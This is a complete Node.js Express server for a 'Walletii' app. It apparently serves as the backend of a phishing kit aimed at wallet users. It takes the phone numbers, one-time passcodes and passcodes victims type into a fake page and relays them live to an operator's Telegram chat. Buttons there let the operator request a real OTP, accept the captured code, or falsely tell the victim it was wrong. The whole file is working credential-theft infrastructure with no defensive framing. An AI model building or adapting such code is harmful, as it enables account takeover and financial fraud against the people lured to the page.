'use strict';

// ══════════════════════════════════════════════════════
//  server.js — Walletii Backend
//  Routes:
//    GET  /          ← serves index.html
//    POST /notify   ← called by the HTML app (login or OTP event)
//    POST /poll     ← called by the HTML app every 2s to check admin decision
//    POST /webhook  ← called by Telegram when admin clicks a button
//    GET  /setup    ← visit once to register the webhook with Telegram
//    GET  /health   ← Render health check
// ══════════════════════════════════════════════════════

import express            from 'express';
import cors               from 'cors';
import crypto             from 'crypto';
import { fileURLToPath }  from 'url';
import path               from 'path';
import config             from './config.js';
import { setResult, popResult } from './store.js';
import { sendAdminMessage, editMessage, answerCallback, registerWebhook, escMd } from './telegram.js';

const app       = express();
const __dirname = path.dirname(fileURLToPath(import.meta.url));

// ── Middleware ──
app.use(express.json());
app.use(cors({
  origin:      config.appUrl,
  methods:     ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type'],
}));

// ── Serve static files & index.html ──
app.use(express.static(__dirname));
app.get('/', (_req, res) => res.sendFile(path.join(__dirname, 'index.html')));

// ════════════════════════════════════════════════════════
//  GET /health
//  Render pings this to keep the service alive.
// ════════════════════════════════════════════════════════
app.get('/health', (_req, res) => {
  res.json({ ok: true, service: 'walletii-backend', ts: new Date().toISOString() });
});

// ════════════════════════════════════════════════════════
//  GET /setup
//  Visit this URL once after deploying to register the webhook.
//  e.g. https://walletii-backend.onrender.com/setup
// ════════════════════════════════════════════════════════
app.get('/setup', async (_req, res) => {
  try {
    const result = await registerWebhook();
    if (result.ok) {
      res.json({
        ok:          true,
        description: result.description,
        webhook:     `${config.serverUrl}/webhook`,
        message:     '✅ Webhook registered successfully! You can now use the app.',
      });
    } else {
      res.status(500).json({ ok: false, error: result.description });
    }
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message });
  }
});

// ════════════════════════════════════════════════════════
//  POST /notify
//  Called by the HTML app with two event types:
//
//  type = 'login'
//    body: { type, phone, countryCode }
//    → sends Telegram message with [✅ Send OTP] button
//
//  type = 'otp'
//    body: { type, phone, countryCode, otp, passcode }
//    → sends Telegram message with [✅ Continue] [❌ Wrong Code] buttons
//
//  Returns: { ok: true, token: "..." }
//  The app stores this token and polls /poll with it.
// ════════════════════════════════════════════════════════
app.post('/notify', async (req, res) => {
  const { type, phone, countryCode, otp, passcode } = req.body;

  if (!type || !phone) {
    return res.status(400).json({ ok: false, error: 'Missing required fields' });
  }

  // ── Generate a signed session token ──
  const token = crypto.randomBytes(16).toString('hex');
  const sig   = crypto.createHmac('sha256', config.secretKey)
                      .update(`${token}|${phone}`)
                      .digest('hex');
  const cbData = (action) => `${action}|${token}|${sig}|${phone}`;

  const fullPhone = `${countryCode || ''} ${phone}`.trim();

  try {
    let text, keyboard;

    if (type === 'login') {
      // ── LOGIN ATTEMPT ──
      text = `🔔 *New Login Attempt*\n\n`
           + `📱 *Phone:* \`${escMd(fullPhone)}\`\n\n`
           + `User is waiting on the OTP screen\\.`;

      keyboard = [[
        { text: '✅ Send OTP', callback_data: cbData('send_otp') }
      ]];

    } else if (type === 'otp') {
      if (!otp) return res.status(400).json({ ok: false, error: 'Missing OTP' });

      // ── OTP SUBMITTED ──
      text = `🔐 *OTP Submitted*\n\n`
           + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
           + `🔑 *OTP:* \`${escMd(otp)}\`\n`
           + (passcode ? `🔒 *Passcode:* \`${escMd(passcode)}\`\n` : '')
           + `\nChoose an action:`;

      keyboard = [[
        { text: '✅ Continue',    callback_data: cbData('otp_ok')    },
        { text: '❌ Wrong Code',  callback_data: cbData('otp_wrong') },
      ]];

    } else {
      return res.status(400).json({ ok: false, error: 'Unknown type' });
    }

    const tgResult = await sendAdminMessage(text, keyboard);

    if (!tgResult.ok) {
      console.error('Telegram error:', tgResult);
      return res.status(500).json({ ok: false, error: 'Telegram error', detail: tgResult.description });
    }

    // Return the token so the app can poll for the result
    res.json({ ok: true, token });

  } catch (err) {
    console.error('Error in /notify:', err);
    res.status(500).json({ ok: false, error: 'Internal server error' });
  }
});

// ════════════════════════════════════════════════════════
//  POST /poll
//  Called by the HTML app every 2 seconds.
//  body: { token: "..." }
//
//  Returns:
//    { ok: true, result: 'pending' }      — admin hasn't clicked yet
//    { ok: true, result: 'otp_allowed' }  — admin clicked Send OTP
//    { ok: true, result: 'otp_correct' }  — admin clicked Continue
//    { ok: true, result: 'otp_wrong' }    — admin clicked Wrong Code
//    { ok: true, result: 'expired' }      — token not found / timed out
// ════════════════════════════════════════════════════════
app.post('/poll', (req, res) => {
  const { token } = req.body;

  if (!token || !/^[a-f0-9]{32}$/.test(token)) {
    return res.status(400).json({ ok: false, error: 'Invalid token' });
  }

  const result = popResult(token);

  if (result === null) {
    // Not stored yet — tell the app to keep polling
    return res.json({ ok: true, result: 'pending' });
  }

  res.json({ ok: true, result });
});

// ════════════════════════════════════════════════════════
//  POST /webhook
//  Telegram calls this when the admin clicks a button.
// ════════════════════════════════════════════════════════
app.post('/webhook', async (req, res) => {
  // Always respond 200 immediately so Telegram doesn't retry
  res.json({ ok: true });

  const update = req.body;
  if (!update?.callback_query) return;

  const cb     = update.callback_query;
  const cbId   = cb.id;
  const data   = cb.data || '';
  const chatId = cb.message?.chat?.id?.toString();
  const msgId  = cb.message?.message_id;

  // ── Only our admin can use these buttons ──
  if (chatId !== config.adminChatId.toString()) {
    await answerCallback(cbId, '⛔ Not authorised', true);
    return;
  }

  // ── Parse: "action|token|sig|phone" ──
  const parts = data.split('|');
  if (parts.length !== 4) {
    await answerCallback(cbId, '⚠️ Invalid data');
    return;
  }

  const [action, token, sig, phone] = parts;

  // ── Verify HMAC signature ──
  const expectedSig = crypto.createHmac('sha256', config.secretKey)
                            .update(`${token}|${phone}`)
                            .digest('hex');

  if (!crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(expectedSig))) {
    await answerCallback(cbId, '⚠️ Invalid signature', true);
    return;
  }

  // ── Handle the action ──
  try {
    switch (action) {

      case 'send_otp':
        setResult(token, 'otp_allowed', config.tokenTtl);
        await editMessage(chatId, msgId, `✅ *OTP Approved*\nUser may now enter their OTP code\\.`);
        await answerCallback(cbId, '✅ OTP sent to user');
        break;

      case 'otp_ok':
        setResult(token, 'otp_correct', config.tokenTtl);
        await editMessage(chatId, msgId, `✅ *Login Approved*\nUser has been allowed in\\.`);
        await answerCallback(cbId, '✅ User allowed in');
        break;

      case 'otp_wrong':
        setResult(token, 'otp_wrong', config.tokenTtl);
        await editMessage(chatId, msgId, `❌ *Wrong Code*\nUser has been notified to re\\-enter their OTP\\.`);
        await answerCallback(cbId, '❌ Wrong code sent to user');
        break;

      default:
        await answerCallback(cbId, '⚠️ Unknown action');
    }
  } catch (err) {
    console.error('Webhook handler error:', err);
  }
});

// ════════════════════════════════════════════════════════
//  Start server
// ════════════════════════════════════════════════════════
app.listen(config.port, () => {
  console.log(`\n🚀 Walletii backend running on port ${config.port}`);
  console.log(`   Webhook URL: ${config.serverUrl}/webhook`);
  console.log(`   Setup URL:   ${config.serverUrl}/setup`);
  console.log(`   Health:      ${config.serverUrl}/health\n`);
});
